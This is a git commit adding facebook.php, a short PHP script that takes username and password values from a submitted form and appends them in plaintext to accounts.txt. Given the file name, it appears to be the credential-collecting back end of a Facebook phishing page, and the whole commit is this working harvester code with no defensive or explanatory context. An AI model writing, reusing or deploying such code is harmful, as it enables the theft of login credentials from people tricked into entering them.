85b0b96fa67bdaba4fb32eb10d2750d8d6900e73
GaganRanaSingh <41983407+GaganRanaSingh@users.noreply.github.com>
2020-05-24 23:41:25 +0530

    Add files via upload

---
+++ facebook.php
@@ -0,0 +1,15 @@
+<?php
+
+if(isset($_POST['submit_btn']))
+{
+ $username = $_POST['name'];
+ $password = $_POST['pwd'];
+ $text = $username . "," . $password . "\n";
+ $fp = fopen('accounts.txt', 'a+');
+
+   if(fwrite($fp, $text))  {
+       echo 'saved';
+
+   }
+fclose ($fp);    
+}
